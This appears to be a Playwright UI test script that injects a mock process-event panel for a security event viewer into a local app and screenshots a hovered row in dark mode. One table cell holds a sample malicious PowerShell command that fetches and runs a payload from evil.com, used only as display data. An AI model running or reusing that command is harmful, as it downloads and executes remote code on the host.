const { chromium } = require('playwright');
const path = require('path');
const fs = require('fs');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  await page.goto('http://localhost:5173');
  await page.waitForTimeout(2000);

  await page.evaluate(() => {
    localStorage.setItem('theme', 'dark');
    window.location.reload();
  });
  await page.waitForTimeout(2000);

  // Directly inject some elements into the app state if possible via window object if we expose it, but we don't.
  // Instead let's just use evaluate to modify the DOM temporarily to see the cytoscape component text color
  await page.evaluate(() => {
     const dummyHtml = `
      <div class="flex flex-col h-full gap-4 bg-gray-50 dark:bg-gray-900 p-4 rounded-lg w-96 absolute right-0 top-0 z-50 bg-white" style="height: 100vh;">
        <div class="flex justify-between items-start border-b border-gray-300 dark:border-gray-700 pb-4">
          <div>
            <h2 class="text-xl font-bold break-all text-blue-700 dark:text-blue-400">powershell.exe</h2>
            <p class="text-sm text-gray-600 dark:text-gray-400 font-mono mt-1">PID: 1003</p>
            <p class="text-xs text-gray-500 dark:text-gray-400 mt-1">First Seen: 2023-10-01T10:02:00Z</p>
          </div>
          <button class="text-gray-500 hover:text-gray-800 dark:text-gray-400 dark:hover:text-gray-200 p-1 bg-white dark:bg-gray-800 rounded-md border border-gray-200 dark:border-gray-700 shadow-sm">✕</button>
        </div>
        <div class="relative">
          <input type="text" placeholder="Filter node events..." value="powershell" class="w-full pl-8 pr-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 shadow-sm" />
        </div>
        <div class="flex-grow overflow-y-auto pr-2 space-y-4">
          <h3 class="font-semibold text-sm text-gray-700 dark:text-gray-300">Associated Events (1)</h3>
          <div class="bg-white dark:bg-gray-800 p-3 rounded-lg border border-gray-200 dark:border-gray-700 shadow-sm">
             <div class="text-xs font-bold mb-2 text-indigo-600 dark:text-indigo-400 uppercase tracking-wider">ProcessCreate</div>
             <table class="w-full text-xs" id="hoverTable">
               <tbody>
                 <tr class="border-b border-gray-200 dark:border-gray-700 last:border-0 hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors">
                   <td class="py-2 pr-2 font-semibold text-gray-600 dark:text-gray-400 w-1/3 align-top break-words">process_name</td>
                   <td class="py-2 font-mono text-gray-900 dark:text-gray-100 break-all"><span class="bg-yellow-400 dark:bg-yellow-500 text-gray-900 px-1 rounded font-bold">powershell</span>.exe</td>
                 </tr>
                 <tr class="border-b border-gray-200 dark:border-gray-700 last:border-0 hover:bg-gray-50 dark:hover:bg-gray-700 transition-colors" id="hoverTarget">
                   <td class="py-2 pr-2 font-semibold text-gray-600 dark:text-gray-400 w-1/3 align-top break-words">command_line</td>
                   <td class="py-2 font-mono text-gray-900 dark:text-gray-100 break-all"><span class="bg-yellow-400 dark:bg-yellow-500 text-gray-900 px-1 rounded font-bold">powershell</span>.exe -w hidden -c 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload")'</td>
                 </tr>
               </tbody>
             </table>
          </div>
        </div>
      </div>
     `;
     document.body.insertAdjacentHTML('beforeend', dummyHtml);
  });
  await page.waitForTimeout(2000);

  // Hover over the second row
  await page.hover('#hoverTarget');
  await page.waitForTimeout(500); // Give time for transition

  await page.screenshot({ path: 'right-panel-hover-dark-mode.png', fullPage: true });
  console.log('Screenshot saved to right-panel-hover-dark-mode.png');
  await browser.close();
})();
